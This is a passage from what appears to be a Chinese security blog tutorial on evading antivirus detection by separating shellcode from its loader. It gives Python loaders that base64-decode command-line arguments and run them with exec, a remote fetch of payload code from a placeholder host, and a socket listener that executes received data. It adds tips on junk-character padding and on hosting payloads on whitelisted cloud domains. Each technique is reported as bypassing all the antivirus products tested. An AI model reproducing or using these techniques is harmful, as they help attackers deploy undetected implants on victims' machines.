src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000600828.png" alt="image-20230508000600828"></p><h6 id="将shellcode复制出来"><a href="#将shellcode复制出来" class="headerlink" title="将shellcode复制出来"></a>将shellcode复制出来</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000652155.png" alt="image-20230508000652155"></p><h6 id="创建file-1-py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b-以bit流传输，先将其base64编码后的结果打印出来"><a href="#创建file-1-py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b-以bit流传输，先将其base64编码后的结果打印出来" class="headerlink" title="创建file_1.py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b,以bit流传输，先将其base64编码后的结果打印出来"></a>创建file_1.py，写入以下内容，先将其他的内容注释，在shellcode其前面加上b,以bit流传输，先将其base64编码后的结果打印出来</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508000910355.png" alt="image-20230508000910355"></p><h6 id="在当前目录，创建一个s-txt文件，内容为上面打印出的内容"><a href="#在当前目录，创建一个s-txt文件，内容为上面打印出的内容" class="headerlink" title="在当前目录，创建一个s.txt文件，内容为上面打印出的内容"></a>在当前目录，创建一个s.txt文件，内容为上面打印出的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001030535.png" alt="image-20230508001030535"></p><h6 id="复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s-txt"><a href="#复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s-txt" class="headerlink" title="复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s.txt"></a>复原代码上面的代码，使用python的读取文件代码，读取当前目录下的s.txt</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001344730.png" alt="image-20230508001344730"></p><h6 id="运行程序可以上线"><a href="#运行程序可以上线" class="headerlink" title="运行程序可以上线"></a>运行程序可以上线</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001408589.png" alt="image-20230508001408589"></p><h6 id="将file-1-py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下"><a href="#将file-1-py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下" class="headerlink" title="将file_1.py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下"></a>将file_1.py复制到py2exe（比pyinstaller兼容性更好，免杀更好）文件下</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001601883.png" alt="image-20230508001601883"></p><h6 id="将setup-py里面的内容对应修改成要打包成exe的py文件"><a href="#将setup-py里面的内容对应修改成要打包成exe的py文件" class="headerlink" title="将setup.py里面的内容对应修改成要打包成exe的py文件"></a>将setup.py里面的内容对应修改成要打包成exe的py文件</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001524511.png" alt="image-20230508001524511"></p><h6 id="执行命令进行编译"><a href="#执行命令进行编译" class="headerlink" title="执行命令进行编译"></a>执行命令进行编译</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001738788.png" alt="image-20230508001738788"></p><h6 id="在dist目录下会产生file-1-exe文件，将其放到x绒-x60，DF上面都没有被杀"><a href="#在dist目录下会产生file-1-exe文件，将其放到x绒-x60，DF上面都没有被杀" class="headerlink" title="在dist目录下会产生file_1.exe文件，将其放到x绒,x60，DF上面都没有被杀"></a>在dist目录下会产生file_1.exe文件，将其放到x绒,x60，DF上面都没有被杀</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508001819819.png" alt="image-20230508001819819"></p><h6 id="将s-txt放到和exe文件相同的目录下，发现只有DF识别到了s-txt里面有恶意内容，被杀了，其他两个可以正常执行"><a href="#将s-txt放到和exe文件相同的目录下，发现只有DF识别到了s-txt里面有恶意内容，被杀了，其他两个可以正常执行" class="headerlink" title="将s.txt放到和exe文件相同的目录下，发现只有DF识别到了s.txt里面有恶意内容，被杀了，其他两个可以正常执行"></a>将s.txt放到和exe文件相同的目录下，发现只有DF识别到了s.txt里面有恶意内容，被杀了，其他两个可以正常执行</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002019614.png" alt="image-20230508002019614"></p><h6 id="在s-txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s-txt里面的内容"><a href="#在s-txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s-txt里面的内容" class="headerlink" title="在s.txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s.txt里面的内容"></a>在s.txt里面任意添加一些”xiaodi”字符用来干扰，让其识别不出s.txt里面的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002256450.png" alt="image-20230508002256450"></p><h6 id="在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码"><a href="#在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码" class="headerlink" title="在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码"></a>在执行上线的文件里面，让其在接收shellcode时，将里面的”xiaodi”字符替换为空，又变回原来的代码</h6><h6 id="（最后绕过了所有，没有被杀）"><a href="#（最后绕过了所有，没有被杀）" class="headerlink" title="（最后绕过了所有，没有被杀）"></a>（最后绕过了所有，没有被杀）</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508002126083.png" alt="image-20230508002126083"></p><h3 id="Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）"><a href="#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）" class="headerlink" title="#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）"></a>#Python-Argv-将shellcode与加载器分离（全绕过）（上线exe为接收执行代码和shellcode的程序）</h3><blockquote><p>import ctypes<br>import sys,base64</p><p>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘:<br>    s&#x3D;sys.argv[1]<br>    sc&#x3D;base64.b64decode(s)<br>    z&#x3D;sys.argv[2]<br>    zx&#x3D;base64.b64decode(z)<br>    exec(zx)</p><p>在程序执行时，它会接收两个命令行参数。第一个参数<code>s</code>是一个经过Base64编码的字符串，通过<code>base64.b64decode()</code>解码后，将结果赋给变量<code>sc</code>。第二个参数<code>z</code>也是一个经过Base64编码的字符串，通过<code>base64.b64decode()</code>解码后，将结果赋给变量<code>zx</code>。</p><p>最后一行使用<code>exec()</code>函数来执行变量<code>zx</code>中的代码。<code>exec()</code>函数用于执行动态生成的Python代码。这意味着，如果你将一段可执行的Python代码作为第二个命令行参数传递给这个脚本，它将会执行该代码。</p></blockquote><p>核心代码：</p><p>z&#x3D;sys.argv[1]</p><p>zx&#x3D;base64.b64decode(z)</p><p>exec(zx)</p><h6 id="示例理解sys-argv函数"><a href="#示例理解sys-argv函数" class="headerlink" title="示例理解sys.argv函数"></a>示例理解sys.argv函数</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004559866.png" alt="image-20230508004559866"></p><h6 id="这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1"><a href="#这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1" class="headerlink" title="这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1"></a>这里是执行打印内容的功能，在后面第一个参数上写上要打印的内容，这里输入1，那么就会执行打印出1</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004725697.png" alt="image-20230508004725697"></p><h6 id="而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）"><a href="#而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）" class="headerlink" title="而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）"></a>而这里就是，将执行第一个你传入的参数的内容（恶意上线代码）</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508004855443.png" alt="image-20230508004855443"></p><h6 id="但是如果后面直接写这些上线语句的话，会有格式问题空格等"><a href="#但是如果后面直接写这些上线语句的话，会有格式问题空格等" class="headerlink" title="但是如果后面直接写这些上线语句的话，会有格式问题空格等"></a>但是如果后面直接写这些上线语句的话，会有格式问题空格等</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005030365.png" alt="image-20230508005030365"></p><h6 id="所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import-base6解码操作，后面手动编码传入"><a href="#所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import-base6解码操作，后面手动编码传入" class="headerlink" title="所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import base6解码操作，后面手动编码传入"></a>所以将上面的内容base64编码，可以整理紧凑一点，去掉上面的import base6解码操作，后面手动编码传入</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005252388.png" alt="image-20230508005252388"></p><h6 id="执行代码里面添加解码操作"><a href="#执行代码里面添加解码操作" class="headerlink" title="执行代码里面添加解码操作"></a>执行代码里面添加解码操作</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005142518.png" alt="image-20230508005142518"></p><h6 id="将shellcode代码里面的内容base64编码"><a href="#将shellcode代码里面的内容base64编码" class="headerlink" title="将shellcode代码里面的内容base64编码"></a>将shellcode代码里面的内容base64编码</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005606332.png" alt="image-20230508005606332"></p><h6 id="将执行的代码打包成exe"><a href="#将执行的代码打包成exe" class="headerlink" title="将执行的代码打包成exe"></a>将执行的代码打包成exe</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005736198.png" alt="image-20230508005736198"></p><h6 id="执行exe，后面接上编码后的内容"><a href="#执行exe，后面接上编码后的内容" class="headerlink" title="执行exe，后面接上编码后的内容"></a>执行exe，后面接上编码后的内容</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005910611.png" alt="image-20230508005910611"></p><h6 id="成功上线，而且杀软全部绕过"><a href="#成功上线，而且杀软全部绕过" class="headerlink" title="成功上线，而且杀软全部绕过"></a>成功上线，而且杀软全部绕过</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508005926223.png" alt="image-20230508005926223"></p><h3 id="Python-Http-将shellcode用远程协议加载（全绕过）"><a href="#Python-Http-将shellcode用远程协议加载（全绕过）" class="headerlink" title="#Python-Http-将shellcode用远程协议加载（全绕过）"></a>#Python-Http-将shellcode用远程协议加载（全绕过）</h3><p>核心代码：</p><p>all&#x3D;requests.get(‘<a href="http://www.xxxx.com/all.txt').text">http://www.xxxx.com/all.txt&#39;).text</a></p><h6 id="将代码打包成exe"><a href="#将代码打包成exe" class="headerlink" title="将代码打包成exe"></a>将代码打包成exe</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508105240876.png" alt="image-20230508105240876"></p><h6 id="把下列代码复制到远程服务器网站的111-txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心-放到xxx-aliyun-com类似域名上的网站"><a href="#把下列代码复制到远程服务器网站的111-txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心-放到xxx-aliyun-com类似域名上的网站" class="headerlink" title="把下列代码复制到远程服务器网站的111.txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心,放到xxx.aliyun.com类似域名上的网站"></a>把下列代码复制到远程服务器网站的111.txt上，可以将这些文件放到一些白名单的网站上，例如百度，阿里云，将文件放到个人中心,放到xxx.aliyun.com类似域名上的网站</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508104236993.png" alt="image-20230508104236993"></p><h6 id="一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到"><a href="#一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到" class="headerlink" title="一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到"></a>一个服务器如果经常被用来当作远程执行代码，就会被威胁感知平台检测到</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508104929818.png" alt="image-20230508104929818"></p><h3 id="Python-Socket-将shellcode通过管道传输（全绕过）"><a href="#Python-Socket-将shellcode通过管道传输（全绕过）" class="headerlink" title="#Python-Socket-将shellcode通过管道传输（全绕过）"></a>#Python-Socket-将shellcode通过管道传输（全绕过）</h3><blockquote><p>Socket隧道技术是一种用于在网络上建立隐蔽通信通道的技术。它可以将数据通过网络传输，同时隐藏数据的内容和传输的路径，使得检测和干扰变得更加困难。</p><p>Socket隧道通常涉及两个角色：客户端和服务端。</p><p>客户端：客户端是发起隧道连接的一方。它负责将要传输的数据进行封装并通过Socket连接发送到服务端。客户端还负责接收从服务端返回的数据，并将其解封装并提供给应用程序使用。</p><p>服务端：服务端是接收来自客户端的连接请求的一方。它监听指定的端口，等待客户端的连接。一旦客户端连接成功，服务端负责接收从客户端发送过来的数据，并进行解封装，然后将数据传递给目标服务器或应用程序。</p><h6 id="工作原理："><a href="#工作原理：" class="headerlink" title="工作原理："></a>工作原理：</h6><ol><li>客户端和服务端建立起Socket连接。</li><li>客户端将要传输的数据进行封装，例如加密、编码等操作，然后通过Socket连接发送到服务端。</li><li>服务端接收到客户端发送的数据后，进行解封装，恢复原始数据。</li><li>服务端将解封装后的数据转发给目标服务器或应用程序，实现数据的转发或代理功能。</li><li>目标服务器或应用程序将返回的数据发送给服务端。</li><li>服务端将接收到的数据再次进行封装，通过Socket连接发送给客户端。</li><li>客户端接收到服务端发送的数据后，进行解封装，恢复原始数据，并提供给应用程序使用</li></ol></blockquote><h6 id="参考：【python】–-Socket接收大数据-Wilson-Blogs-博客园-cnblogs-com"><a href="#参考：【python】–-Socket接收大数据-Wilson-Blogs-博客园-cnblogs-com" class="headerlink" title="参考：【python】– Socket接收大数据 - Wilson_Blogs - 博客园 (cnblogs.com)"></a>参考：<a href="https://www.cnblogs.com/Keep-Ambition/p/7459213.html">【python】– Socket接收大数据 - Wilson_Blogs - 博客园 (cnblogs.com)</a></h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508111648144.png" alt="image-20230508111648144"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>(<span class="params">data</span>):</span><br><span class="line">​    执行code</span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">9999</span>))</span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​    conn,addr = server.accept()</span><br><span class="line">​    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">​        zx(data)</span><br></pre></td></tr></table></figure><h6 id="比如上述代码，先启动服务端代码，监听本地端口"><a href="#比如上述代码，先启动服务端代码，监听本地端口" class="headerlink" title="比如上述代码，先启动服务端代码，监听本地端口"></a>比如上述代码，先启动服务端代码，监听本地端口</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114528304.png" alt="image-20230508114528304"></p><h6 id="再启动客户端代码，代码是去连接其服务器的端口"><a href="#再启动客户端代码，代码是去连接其服务器的端口" class="headerlink" title="再启动客户端代码，代码是去连接其服务器的端口"></a>再启动客户端代码，代码是去连接其服务器的端口</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114619141.png" alt="image-20230508114619141"></p><h6 id="尝试执行一个ver-会显示其主机版本"><a href="#尝试执行一个ver-会显示其主机版本" class="headerlink" title="尝试执行一个ver,会显示其主机版本"></a>尝试执行一个ver,会显示其主机版本</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114715570.png" alt="image-20230508114715570"></p><h6 id="同时服务端也会接收到其执行的命令"><a href="#同时服务端也会接收到其执行的命令" class="headerlink" title="同时服务端也会接收到其执行的命令"></a>同时服务端也会接收到其执行的命令</h6><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508114648647.png" alt="image-20230508114648647"></p><h5 id="下面进行socket执行上线代码："><a href="#下面进行socket执行上线代码：" class="headerlink" title="@下面进行socket执行上线代码："></a>@下面进行socket执行上线代码：</h5><p>首先上面的原型代码是执行cmd命令的代码</p><p><img src="/../images/Day112-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB-%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-SOCK%E7%AE%A1%E9%81%93-%E5%8F%82%E6%95%B0%E5%8D%8F%E8%AE%AE%E5%8C%96/image-20230508115021610.png" alt="image-20230508115021610"></p><h6 id="将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc-x3D-base64-b64decode-data-下面就是data未编码之前将要传入的数据"><a href="#将上面执行cmd命令处修改为执行shellcode功能的代码，先把全部内容复制到这里，在sc-x3D-base64-b64decode-data-下面就是data未编码之前将要传入的数据" class="headerlink" 